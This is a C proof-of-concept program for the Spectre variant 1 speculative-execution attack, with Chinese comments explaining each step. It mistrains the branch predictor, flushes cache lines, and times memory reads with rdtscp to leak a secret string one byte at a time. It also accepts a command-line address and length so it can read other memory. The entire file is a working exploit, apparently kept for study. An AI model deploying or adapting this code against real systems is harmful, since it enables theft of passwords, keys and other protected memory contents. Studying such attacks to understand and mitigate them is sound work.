#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char* secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		/*
		   这段代码中只有 array2[array1[x] * 512]才有实质用处。
		   它将密码信息送入到cache中， 
		   但是如果取到的值不赋值给别的变量，
		   编译器会认为这段代码没有用处，
		   会将其删掉，起到优化的效果。
		*/
		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	/*results 记录命中次数
	  tries   尝试次数
	  mix_i   
	*/
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--)
	{
		/* Flush array2[256*(0..255)] from cache */
		/*将缓存清空，_mm_clflush可以使得指定的缓存行无效化*/
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
	    /*30个循环，每训练5次，攻击1次*/
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			/*
				1. j%6==0时                      =>   
				   (j % 6) - 1=-1=0xFFFF.FFFF    =>  
				   (j % 6)-1  & ~0xFFFF =0xFFFF.FFFFF & 0xFFFF.F0000= 0xFFFF.F0000
				   
				2. 否则的话
				   (j % 6) - 1 >=0  => 0-5的16进制数 0x0000.00-0x0000.06
				   (j % 6) - 1 & ~0xFFFF = 最大的 0x0000.06 & 0xFFFF.F0000=0x0000.0000

			*/

			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			/*
                1. j%6==0时   执行这条语句前，x=	0xFFF.FF0000 =>
				   执行以后 x >> 16    x=0xFFF.FFFF=-1
				2. 否则        执行这条语句前，x=0x000.0000 =>
				   执行以后  0x000.0000|0x000.0000=0x000.0000
			*/
			x = training_x ^ (x & (malicious_x ^ training_x));
			/*
			    1. j%6==0时 x=-1=0xFFF.FFFF       =>
				   x&(malicious_x ^ training_x)   => 
				   malicious_x ^ training_x       =>
				   training_x ^ (x & (malicious_x ^ training_x)) =training_x ^ (malicious_x ^ training_x)=malicious_x

				2. 否则 j%6!=0时 x=0=0x000.0000    =>
				   x&(malicious_x ^ training_x)   => x=0x000.0000
				   training_x ^ (x & (malicious_x ^ training_x))=training_x ^ 0x000.0000=training_x
			*/

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			/*
			    这部分代码，是为了不让 i 以1,2,3,4,5,6....的正常顺序做循环，要避免stride prediction 
				使用 ((i * 167) + 13) & 255可以让得到的值是个乱序且不重复的
				可执行以下程序进行体验。

				#include<stdio.h>

				int main()
				{
					int i=0;
					int mix_i;
					for(i=0;i<256;i++)
					{
						mix_i = ((i * 167) + 13) & 255;
						printf("%i\n",mix_i );

					}
					
				}
			
			*/
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

			/*
			    如果运行前和运行后的时间差小于预先设定的值则视为命中，对应的结果上+1记录其命中次数
				运行次数最多的则是我们想要知道的Secret的一位字符

			*/
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */

		/*从results中提取命中次数最多的以及第二多的字符和坐标*/
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char* * argv)
{
	printf("Putting '%s' in memory\n", secret);
	/*secret 		表示我们要窃取的密码       （地址）
	  array1 		表示我们正常申请的一个数组  （地址）
	  malicious_x	表示secret以及array1的差值，我们可以通过array1[malicious_x]来读取secret
	  score[2]		score[0]表示最高分，score[1]表示第二高分
	  value[2]		value[0]表示侦测出来最高分对应的字符，value[1]表示第二高分对应的字符
	*/

	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int score[2], len = strlen(secret);
	uint8_t value[2];

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	
	if (argc == 3)
	{
		/*
			上面已经指定了默认的secret。
			此处允许在命令行后附加参数来自定义secret的值。
		*/
		sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf_s(argv[2], "%d", &len);
	}

	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		/*此函数为程序核心，每次探测 要窃取的密码的 一位字符*/
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		/*输出探测到的字符和备选字符，31到127为可见字符*/
		printf("0x%02X='%c' score=%d ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				   score[1]);
		printf("\n");
	}
#ifdef _MSC_VER
	printf("Press ENTER to exit\n");
	getchar();	/* Pause Windows console */
#endif
	return (0);
}
